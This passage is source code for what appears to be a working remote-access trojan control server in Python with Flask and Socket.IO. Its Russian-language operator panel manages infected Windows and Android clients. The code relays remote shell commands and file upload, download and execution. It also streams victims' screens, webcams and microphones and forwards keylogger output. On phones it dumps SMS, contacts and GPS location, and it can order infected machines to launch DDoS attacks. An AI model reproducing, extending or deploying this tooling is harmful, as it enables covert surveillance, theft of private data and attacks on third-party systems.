            document.getElementById('dropdownLabel').innerText = platform === 'pc' ? 'PC — клиенты' : 'Android — клиенты';
            applyPlatform(platform);
        }
        document.addEventListener('click', () => document.getElementById('dropdownWrap').classList.remove('open'));

        function applyPlatform(platform) {
            currentPlatform = platform;
            document.getElementById('pc-menu').classList.toggle('hidden', platform !== 'pc');
            document.getElementById('phone-menu').classList.toggle('hidden', platform !== 'phone');
            document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
            document.getElementById('view-empty').classList.remove('hidden');
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('active-client-name').innerText = 'Выберите клиента';
            document.getElementById('active-client-ip').innerText = '';
            document.getElementById('active-client-uptime').innerText = '';
            currentClientId = null;
            renderClients(lastClientsData);
        }

        socket.on('update_clients', (clientsData) => {
            lastClientsData = clientsData;
            renderClients(clientsData);
        });

        function renderClients(clientsData) {
            const list = document.getElementById('client-list');
            list.innerHTML = '';
            if (!currentPlatform) { list.innerHTML = '<div class="text-center text-xs text-gray-600 py-4 font-mono">СНАЧАЛА ВЫБЕРИ ПЛАТФОРМУ</div>'; return; }
            let count = 0;
            for (let id in clientsData) {
                const c = clientsData[id];
                const isPhone = (c.os || '').toLowerCase().includes('android');
                if (currentPlatform === 'pc' && isPhone) continue;
                if (currentPlatform === 'phone' && !isPhone) continue;
                count++;
                
                const up = Math.floor(Date.now() / 1000 - c.connected_at);
                const isOnline = c.screen_on !== false;

                const div = document.createElement('div');
                div.id = `client-${id}`;
                div.className = `client-row flex items-center justify-between px-3 py-2 rounded text-xs border border-transparent ${currentClientId === id ? 'selected border-blue-800' : ''}`;
                div.innerHTML = `
                    <div class="flex flex-col gap-1">
                        <span class="font-bold text-gray-200">${c.user}</span>
                        <span class="font-mono text-[10px] text-gray-500">${c.ip}</span>
                    </div>
                    <div class="flex flex-col items-end gap-1">
                        <span class="text-[10px] text-gray-400">${formatUptime(up)}</span>
                        <div class="flex items-center gap-2">
                            <span class="text-[10px] text-gray-500">${isOnline ? 'online' : 'offline'}</span>
                            <div class="status-dot w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 shadow-[0_0_5px_#10b981]' : 'bg-red-500 shadow-[0_0_5px_#ef4444]'}"></div>
                        </div>
                    </div>
                `;
                div.onclick = () => selectClient(id, c);
                list.appendChild(div);
            }
            if (count === 0) list.innerHTML = '<div class="text-center text-xs text-gray-600 py-4 font-mono">NO CONNECTIONS</div>';
        }

        function selectClient(id, data) {
            currentClientId = id;
            document.getElementById('active-client-name').innerText = data.user;
            document.getElementById('active-client-ip').innerText = data.ip;
            document.getElementById('view-empty').classList.add('hidden');
            document.getElementById('main-menu').classList.remove('hidden');
            switchView(currentPlatform === 'pc' ? 'control' : 'phone-info');
            socket.emit('get_activity_log', { client_id: id });
            if (data.info) document.getElementById('phone-info-data').innerText = JSON.stringify(data.info, null, 2);
        }

        function switchView(view) {
            if (!currentClientId) return;
            document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
            const target = document.getElementById(`view-${view}`);
            if (target) target.classList.remove('hidden');
            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
            if (event && event.currentTarget) event.currentTarget.classList.add('active');
        }

        function switchTab(tabId, event) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
            const tab = document.getElementById(`tab-${tabId}`);
            if (tab) tab.classList.remove('hidden');
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            if (event && event.target) {
                const btn = event.target.closest('.tab-btn');
                if (btn) btn.classList.add('active');
            }
            if (tabId === 'explorer') requestDir('C:/');
        }

        // --- PC LOGIC ---
        function startDdos() {
            const ip = document.getElementById('ddos-ip').value, port = document.getElementById('ddos-port').value, method = document.getElementById('ddos-method').value, threads = document.getElementById('ddos-threads').value;
            if (!ip || !port) return alert('Введи IP и порт!');
            document.getElementById('ddos-status').innerText = "Атака запущена...";
            document.getElementById('ddos-status').className = "text-red-500 animate-pulse text-center mt-4 font-bold";
            socket.emit('system_cmd', {client_id: currentClientId, cmd: 'ddos_start', ip, port, method, threads});
        }
        function stopDdos() {
            document.getElementById('ddos-status').innerText = "Остановлено";
            document.getElementById('ddos-status').className = "text-gray-500 text-center mt-4";
            socket.emit('system_cmd', {client_id: currentClientId, cmd: 'ddos_stop'});
        }
        function setVolume(val) {
            document.getElementById('vol-value').innerText = val + '%';
            if (volLocked && val < 100) { document.getElementById('vol-slider').value = 100; document.getElementById('vol-value').innerText = '100%'; return; }
            socket.emit('system_cmd', {client_id: currentClientId, cmd: 'set_volume', value: parseInt(val)});
        }
        function toggleVolLock(state) {
            volLocked = state;
            const lockIcon = document.getElementById('lock-icon');
            if (state) { lockIcon.classList.remove('text-gray-500'); lockIcon.classList.add('text-red-500', 'animate-pulse'); setVolume(100); }
            else { lockIcon.classList.add('text-gray-500'); lockIcon.classList.remove('text-red-500', 'animate-pulse'); }
            socket.emit('system_cmd', {client_id: currentClientId, cmd: 'lock_volume', state});
        }
        function toggleMute() { socket.emit('system_cmd', {client_id: currentClientId, cmd: 'mute_volume'}); }
        function systemCmd(cmd) { if (confirm('Вы уверены?')) socket.emit('system_cmd', {client_id: currentClientId, cmd}); }
        function sendTroll(cmd) {
            let payload = {client_id: currentClientId, cmd};
            if (cmd === 'msgbox') { payload.title = document.getElementById('troll-title').value || 'Error'; payload.text = document.getElementById('troll-text').value || 'Error'; }
            else if (cmd === 'openurl') { const url = document.getElementById('troll-url').value; if (!url) return alert('Введи ссылку!'); payload.url = url; }
            socket.emit('system_cmd', payload);
        }
        function sendChatMsg() {
            const inp = document.getElementById('chat-input'); const msg = inp.value; if (!msg) return;
            socket.emit('chat_msg', {client_id: currentClientId, msg, sender: 'admin'});
            addChatMsg('admin', msg); inp.value = '';
        }
        function addChatMsg(sender, msg) {
            const chat = document.getElementById('chat-messages'); const div = document.createElement('div');
            div.className = sender === 'admin' ? 'chat-bubble chat-admin' : 'chat-bubble chat-client';
            div.innerText = msg; chat.appendChild(div); chat.scrollTop = chat.scrollHeight;
        }
        socket.on('chat_msg', (data) => { if (data.client_id === currentClientId && data.sender === 'client') addChatMsg('client', data.msg); });

        function toggleFeature(feature, state) {
            socket.emit('toggle_feature', {client_id: currentClientId, feature, state});
            if (feature === 'screen') { document.getElementById('screen-placeholder').style.display = state ? 'none' : 'flex'; if (!state) document.getElementById('screen').style.display = 'none'; }
            if (feature === 'webcam') { document.getElementById('webcam-placeholder').style.display = state ? 'none' : 'flex'; if (!state) document.getElementById('webcam').style.display = 'none'; }
        }
        function mouseMove(e) {
            if (!document.getElementById('toggle-screen').checked || !document.getElementById('toggle-mouse').checked) return;
            const rect = e.target.getBoundingClientRect();
            socket.emit('mouse_move', {client_id: currentClientId, x: Math.round((e.clientX - rect.left) * (1920 / rect.width)), y: Math.round((e.clientY - rect.top) * (1080 / rect.height))});
        }
        function mouseDown(e) {
            if (!document.getElementById('toggle-screen').checked || !document.getElementById('toggle-mouse').checked) return;
            socket.emit('mouse_click', {client_id: currentClientId, button: 'left'});
        }
        document.addEventListener('keydown', (e) => {
            if (currentClientId && !document.getElementById('view-control').classList.contains('hidden') && document.getElementById('toggle-screen').checked && document.getElementById('toggle-keyboard').checked) {
                e.preventDefault(); socket.emit('key_press', {client_id: currentClientId, key: e.key});
            }
        });
        let history = ["C:/"]; let historyIndex = 0;
        function requestDir(path, isBackOrForward = false) {
            if (!isBackOrForward) { history = history.slice(0, historyIndex + 1); if (history[historyIndex] !== path) { history.push(path); historyIndex++; } }
            socket.emit('req_dir', {client_id: currentClientId, path});
        }
        function goBack() { if (historyIndex > 0) { historyIndex--; requestDir(history[historyIndex], true); } }
        function goForward() { if (historyIndex < history.length - 1) { historyIndex++; requestDir(history[historyIndex], true); } }
        socket.on('dir_list', (data) => {
            document.getElementById('current-path').innerText = data.path;
            const list = document.getElementById('file-list'); list.innerHTML = '';
            if (data.path !== 'C:/') {
                const upDiv = document.createElement('div');
                upDiv.className = 'p-2 border-b border-gray-800 hover:bg-[#1f2937] cursor-pointer flex items-center gap-3 text-xs text-blue-400';
                upDiv.innerHTML = `<i class="fa-solid fa-arrow-up"></i> <span>..</span>`;
                upDiv.onclick = () => { const parent = data.path.substring(0, data.path.lastIndexOf('/')); requestDir(parent || 'C:/'); };
                list.appendChild(upDiv);
            }
            data.files.forEach(f => {
                const div = document.createElement('div');
                div.className = 'p-2 border-b border-gray-800 hover:bg-[#1f2937] cursor-pointer flex items-center gap-3 text-xs';
                if (f.is_dir) {
                    div.innerHTML = `<i class="fa-solid fa-folder text-blue-500"></i> <span class="text-gray-300">${f.name}</span> <button class="dl-btn ml-auto text-gray-500 hover:text-white px-2"><i class="fa-solid fa-download"></i></button>`;
                    div.querySelector('.dl-btn').onclick = (e) => { e.stopPropagation(); downloadFile(f.path, f.name + ".zip"); };
                    div.onclick = () => requestDir(f.path);
                } else {
                    div.innerHTML = `<i class="fa-solid fa-file text-gray-600"></i> <span class="text-gray-400">${f.name}</span> <button class="dl-btn ml-auto text-gray-500 hover:text-white px-2"><i class="fa-solid fa-download"></i></button>`;
                    div.querySelector('.dl-btn').onclick = (e) => { e.stopPropagation(); downloadFile(f.path, f.name); };
                    div.onclick = () => { if (confirm(`Запустить ${f.name}?`)) socket.emit('run_file', {client_id: currentClientId, path: f.path}); };
                }
                list.appendChild(div);
            });
        });
        function downloadFile(path, name) { downloadChunks[name] = []; socket.emit('download_file', {client_id: currentClientId, path, is_dir: name.endsWith('.zip')}); }
        function uploadFile(input) {
            if (!input.files.length) return;
            const file = input.files[0]; const currentPath = document.getElementById('current-path').innerText;
            const reader = new FileReader();
            reader.onload = function(e) { socket.emit('upload_file', {client_id: currentClientId, filename: file.name, b64: e.target.result.split(',')[1], save_path: currentPath}); alert("Отправлено!"); input.value = ""; };
            reader.readAsDataURL(file);
        }
        function sendCommand() {
            const cmd = document.getElementById('console-input').value; if (!cmd) return;
            document.getElementById('console-output').innerHTML += `<div class="text-white mt-1">C:\\> ${cmd}</div>`;
            socket.emit('exec_cmd', {client_id: currentClientId, cmd}); document.getElementById('console-input').value = '';
        }
        socket.on('cmd_result', (data) => {
            const out = document.getElementById('console-output');
            out.innerHTML += `<pre class="text-gray-300 mt-1 mb-2 whitespace-pre-wrap">${data.result}</pre>`;
            out.scrollTop = out.scrollHeight;
            if (data.result.includes("Ошибка") || data.result.includes("Файл не найден")) alert(data.result);
        });
        function getProcesses() { socket.emit('get_processes', {client_id: currentClientId}); }
        socket.on('process_list', (data) => {
            const list = document.getElementById('process-list'); list.innerHTML = '';
            data.procs.forEach(p => { list.innerHTML += `<div class="p-1 border-b border-gray-800 hover:bg-[#1f2937] flex justify-between"><span class="text-gray-400">PID: <span class="text-white">${p.pid}</span> | ${p.name}</span> <span class="text-green-500">${p.mem}%</span></div>`; });
        });
        socket.on('file_chunk', (data) => {
            const fileId = data.filename; if (!downloadChunks[fileId]) downloadChunks[fileId] = [];
            downloadChunks[fileId][data.index] = data.b64;
            if (data.index === data.total - 1) {
                const byteCharacters = atob(downloadChunks[fileId].join('')); const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
                const blob = new Blob([new Uint8Array(byteNumbers)], {type: "application/octet-stream"});
                const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = data.filename;
                document.body.appendChild(link); link.click(); document.body.removeChild(link); URL.revokeObjectURL(link.href);
                delete downloadChunks[fileId];
            }
        });
        socket.on('screen_frame', (data) => { const img = document.getElementById('screen'); img.src = 'data:image/jpeg;base64,' + data; img.style.display = 'block'; });
        socket.on('webcam_frame', (data) => { const img = document.getElementById('webcam'); img.src = 'data:image/jpeg;base64,' + data; img.style.display = 'block'; });

        // --- PHONE LOGIC ---
        function dumpData(type) {
            if (!currentClientId) return;
            socket.emit('cmd_dump', { client_id: currentClientId, type: type });
        }
        socket.on('phone_data', (data) => {
            if (data.client_id !== currentClientId) return;
            if (data.type === 'sms') document.getElementById('sms-list').innerText = JSON.stringify(data.payload, null, 2);
            if (data.type === 'contacts') document.getElementById('contacts-list').innerText = JSON.stringify(data.payload, null, 2);
            if (data.type === 'geo') {
                const g = data.payload;
                document.getElementById('gps-data').innerHTML = `<a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" class="text-blue-400 hover:underline"><i class="fa-solid fa-map-location-dot mr-2"></i>Широта: ${g.lat}, Долгота: ${g.lon}</a>`;
            }
        });

        socket.on('phone_cam', (data) => {
            if (data.client_id === currentClientId) {
                const img = document.getElementById('cam-img'); img.src = 'data:image/jpeg;base64,' + data.img;
                img.classList.remove('hidden'); document.getElementById('cam-placeholder').classList.add('hidden');
            }
        });
        socket.on('phone_screen', (data) => {
            if (data.client_id === currentClientId) {
                const img = document.getElementById('scr-img'); img.src = 'data:image/jpeg;base64,' + data.img;
                img.classList.remove('hidden'); document.getElementById('scr-placeholder').classList.add('hidden');
            }
        });

        // --- SPY LOGS ---
        socket.on('keylog', (data) => {
            if (data.client_id === currentClientId && !document.getElementById('view-keylog').classList.contains('hidden')) {
                const out = document.getElementById('keylog-output'); out.innerText += data.data; out.scrollTop = out.scrollHeight;
            }
        });
        socket.on('activity_log_history', (data) => {
            if (data.client_id === currentClientId) {
                const out = document.getElementById('activity-log-output'); out.innerText = data.logs.join('\\n'); out.scrollTop = out.scrollHeight;
            }
        });
        socket.on('activity_log_update', (data) => {
            if (data.client_id === currentClientId) {
                const out = document.getElementById('activity-log-output'); out.innerText += '\\n' + data.log; out.scrollTop = out.scrollHeight;
            }
        });

        document.getElementById('dropdownWrap').classList.remove('open');
        renderClients({});
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@socketio.on('connect')
def handle_connect(): socketio.emit('update_clients', clients)

@socketio.on('get_clients_ping')
def handle_ping(): socketio.emit('update_clients', clients)

@socketio.on('register_client')
def handle_register(data):
    cid = data['id']
    data['connected_at'] = time.time()
    data['screen_on'] = True
    clients[cid] = data
    
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_msg = f"[{timestamp}] Клиент подключен (ONLINE)"
    if cid not in activity_logs: activity_logs[cid] = []
    activity_logs[cid].append(log_msg)
    
    socketio.emit('update_clients', clients)
    socketio.emit('activity_log_update', {"client_id": cid, "log": log_msg})

@socketio.on('screen_state')
def handle_screen_state(data):
    cid = data.get('client_id'); state = data.get('state')
    if cid in clients and clients[cid].get('screen_on') != state:
        clients[cid]['screen_on'] = state
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        status_text = "ONLINE" if state else "OFFLINE"
        log_msg = f"[{timestamp}] {status_text}"
        if cid not in activity_logs: activity_logs[cid] = []
        activity_logs[cid].append(log_msg)
        socketio.emit('update_clients', clients)
        socketio.emit('activity_log_update', {"client_id": cid, "log": log_msg})

@socketio.on('get_activity_log')
def handle_get_activity_log(data):
    cid = data.get('client_id')
    socketio.emit('activity_log_history', {"client_id": cid, "logs": activity_logs.get(cid, [])})

@socketio.on('cmd_dump')
def handle_cmd_dump(data):
    socketio.emit('cmd_dump', data)

@socketio.on('phone_data')
def handle_phone_data(data):
    socketio.emit('phone_data', data)

@socketio.on('phone_cam')
def handle_phone_cam(data):
    socketio.emit('phone_cam', data)

@socketio.on('phone_screen')
def handle_phone_screen(data):
    socketio.emit('phone_screen', data)

@socketio.on('keylog')
def handle_keylog(data):
    socketio.emit('keylog', data)

@socketio.on('screen_frame')
def handle_screen(data): socketio.emit('screen_frame', data['img'])
@socketio.on('webcam_frame')
def handle_webcam(data): socketio.emit('webcam_frame', data['img'])
@socketio.on('mic_audio')
def handle_mic(data): socketio.emit('mic_audio', data['b64'])
@socketio.on('toggle_feature')
def handle_toggle(data): socketio.emit('cmd_toggle', data)
@socketio.on('req_dir')
def handle_req_dir(data): socketio.emit('cmd_req_dir', data)
@socketio.on('dir_list')
def handle_dir_list(data): socketio.emit('dir_list', data)
@socketio.on('run_file')
def handle_run_file(data): socketio.emit('cmd_run_file', data)
@socketio.on('upload_file')
def handle_upload(data): socketio.emit('cmd_upload_file', data)
@socketio.on('mouse_move')
def handle_mouse_move(data): socketio.emit('mouse_move', data)
@socketio.on('mouse_click')
def handle_mouse_click(data): socketio.emit('mouse_click', data)
@socketio.on('key_press')
def handle_key_press(data): socketio.emit('key_press', data)
@socketio.on('exec_cmd')
def handle_exec(data): socketio.emit('cmd_exec', data)
@socketio.on('cmd_result')
def handle_result(data): socketio.emit('cmd_result', data)
@socketio.on('get_processes')
def handle_get_procs(data): socketio.emit('cmd_get_procs', data)
@socketio.on('process_list')
def handle_procs(data): socketio.emit('process_list', data)
@socketio.on('download_file')
def handle_dl(data): socketio.emit('cmd_download', data)
@socketio.on('file_chunk')
def handle_file_chunk(data): socketio.emit('file_chunk', data)
@socketio.on('system_cmd')
def handle_system_cmd(data): socketio.emit('cmd_system', data)
@socketio.on('chat_msg')
def handle_chat(data): socketio.emit('chat_msg', data)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
